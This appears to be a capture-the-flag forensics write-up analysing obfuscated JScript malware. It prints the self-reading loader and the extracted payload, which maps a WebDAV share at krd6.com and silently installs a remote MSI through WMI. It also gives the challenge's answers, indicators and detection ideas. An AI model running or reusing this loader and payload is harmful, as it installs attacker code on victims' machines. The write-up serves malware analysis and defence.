# HTB Sherlock: Obfuscated JavaScript

Author: Truong (Daniel) Dinh
Category: DFIR / malware analysis
Tools: Kali Linux, unzip, tr, grep, cut, sed, less

## Scenario

Employees at a mid-sized tech company reported that their web applications were misbehaving. Several JavaScript files turned out to be heavily obfuscated with misleading comments, renamed variables and encoded strings. My job was to work out how the obfuscation works and whether anything malicious was hidden in the code.

## 1. Unpacking the sample

The archive is nested. The outer zip holds `danger.txt` and a second archive, `Danger.zip`, which contains the sample itself.

```bash
mkdir ~/obf && cd ~/obf
unzip ObfuscatedJavascript.zip
mkdir sample && unzip Danger.zip -d sample
cd sample
file sample
wc -c sample
```

`file` reported ASCII text with very long lines and Windows (CRLF) line endings. The file is 881,141 bytes, which is a lot for a script. I never executed it and only read it as text.

## 2. First look: comment padding

The first lines of the file were all comments full of random dictionary words:

```
// preconvention norimon ophthalmy patricide retransport uncleared Alkaid ...
// dowdy alphabetist redressor antinationalist unbelligerent inserter ...
```

Thousands of these lines inflate the file and bury the real code. I converted the line endings and stripped every comment line to see what was left:

```bash
tr -d '\r' < sample > sample.js
grep -vE '^\s*//' sample.js | grep -vE '^\s*$' > clean.js
```

## 3. The loader

After stripping comments, only a short loader remained:

```js
var a = (function() {
    var b = new ActiveXObject("Scripting.FileSystemObject"),
        c = WScript.ScriptFullName,
        d = "";
    function e() {
        if (!b.FileExists(c)) return;
        var f = b.OpenTextFile(c, 1);
        while (!f.AtEndOfStream) {
            var g = f.ReadLine();
            if (g.slice(0, 8) === "////////") d += g.substr(8) + "\n";
        }
        f.Close();
    }
    function h() {
        if (d !== "") {
            var i = new Function(d);
            i();
        }
    }
    return { j: function() { try { e(); h(); } catch (k) {} } };
})();
a.j();
```

This runs under Windows Script Host. It opens its own file through `Scripting.FileSystemObject` and `WScript.ScriptFullName`, collects every line that starts with eight slashes, removes those slashes and runs the result with `new Function()`, which works like `eval`. The junk comments start with `// `, so the payload lines blend in with them. My first cleanup step had deleted the payload along with the junk, which is a good reminder to read the loader before throwing anything away.

## 4. Extracting the payload

I did what the loader does but wrote the output to a file instead of running it:

```bash
grep '^////////' sample.js | cut -c9- > payload.js
wc -l payload.js    # 51 lines
```

The payload was plain, readable JScript:

```js
var network = new ActiveXObject("WScript.Network");
var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2");
var attempt = 0;

function isDriveMapped(letter) {
    var drives = network.EnumNetworkDrives();
    ...
}
...
if (!connected && attempt > 5) {
    var command = 'net use ' + letter + ' \\\\krd6.com@80\\share\\ /persistent:no';
    wmi.Get("Win32_Process").Create(command, null, null, null);

    var startTime = new Date();
    while (new Date() - startTime < 3000) {}

    connected = isDriveMapped(letter);
}

if (connected) {
    var installCommand = 'msiexec.exe /i \\\\krd6.com@80\\share\\avp.msi /qn';
    wmi.Get("Win32_Process").Create(installCommand, null, null, null);
    try {
        network.RemoveNetworkDrive(letter, true, true);
    } catch (e) {}
} else {
    WScript.Echo("Failed.");
}
```

## 5. What the payload does

1. It creates a `WScript.Network` object and connects to WMI in `root\cimv2`.
2. `isDriveMapped()` calls `EnumNetworkDrives()` to check whether a drive letter is already mapped.
3. After more than five failed attempts it runs `net use` to map a drive to `\\krd6.com@80\share\`. The `@80` part makes Windows reach the share over WebDAV on HTTP port 80, which gets past networks that block SMB.
4. Commands are launched through WMI `Win32_Process.Create` instead of `WScript.Shell`, so the new process is not a child of `wscript.exe`.
5. Instead of calling `Sleep`, it waits 3000 ms in a busy loop.
6. If the drive is mapped, it installs `avp.msi` from the remote share with `msiexec /qn` (silent, no UI), then removes the mapped drive to clean up.
7. If mapping fails it prints `Failed.`.

`avp.msi` is a name used by Kaspersky's installer, so the attacker was probably trying to make the package look legitimate.

## 6. Answers

| Task | Question | Answer |
|---|---|---|
| 0 | ActiveXObject created in the script | `WScript.Network` |
| 1 | WMI namespace accessed | `root\cimv2` |
| 2 | Initial value of `attempt` | `0` |
| 3 | Function used to enumerate network drives | `EnumNetworkDrives` |
| 4 | Wait time after `net use` (ms) | `3000` |
| 5 | MSI package used for installation | `avp.msi` |
| 6 | Output message if removal fails | `Failed.` |
| 7 | Function that checks if a drive is mapped | `isDriveMapped` |

## 7. Indicators of compromise

| Type | Value |
|---|---|
| Domain | `krd6.com` |
| UNC path | `\\krd6.com@80\share\` |
| File | `avp.msi` |
| Command | `net use <letter> \\krd6.com@80\share\ /persistent:no` |
| Command | `msiexec.exe /i \\krd6.com@80\share\avp.msi /qn` |

## 8. MITRE ATT&CK mapping

| Technique | ID | Evidence |
|---|---|---|
| Obfuscated Files or Information | T1027 | Junk comment padding hides the payload |
| Command and Scripting Interpreter: JavaScript | T1059.007 | JScript run by Windows Script Host |
| Windows Management Instrumentation | T1047 | `Win32_Process.Create` launches commands |
| Ingress Tool Transfer | T1105 | MSI pulled from a remote WebDAV share |
| System Binary Proxy Execution: Msiexec | T1218.007 | Silent `msiexec /i` install |
| Indicator Removal | T1070 | Mapped drive removed after install |

## 9. Detection ideas

- Alert on `wscript.exe` or `cscript.exe` running `.js` files from user folders or email attachments.
- Watch for `msiexec.exe` installing from a UNC or `@80` WebDAV path.
- Flag `WmiPrvSE.exe` spawning `net.exe` or `msiexec.exe`.
- Treat outbound WebDAV traffic (`DavWWWRoot`, PROPFIND requests) to unknown domains as suspicious.
- Block `krd6.com` at DNS and proxy.

## Takeaways

The obfuscation here is simple. There is no encryption, only volume: about 880 KB of noise around 51 lines of code. Reading the loader first told me exactly where to look, and reproducing its logic with `grep` and `cut` got the payload out safely without running anything.
